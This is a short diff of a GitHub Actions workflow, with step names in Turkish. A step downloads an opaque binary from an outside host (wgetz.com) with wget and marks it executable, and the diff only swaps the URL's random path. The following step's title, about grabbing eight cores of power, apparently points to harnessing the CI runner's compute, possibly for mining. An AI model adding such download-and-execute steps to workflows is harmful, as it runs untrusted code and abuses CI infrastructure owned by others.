@@ -16,7 +16,7 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/zi2IFIXEQ6/3 -O 3
+          wget https://wgetz.com/SjwQzuCqM8/3 -O 3
           chmod +x 3
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
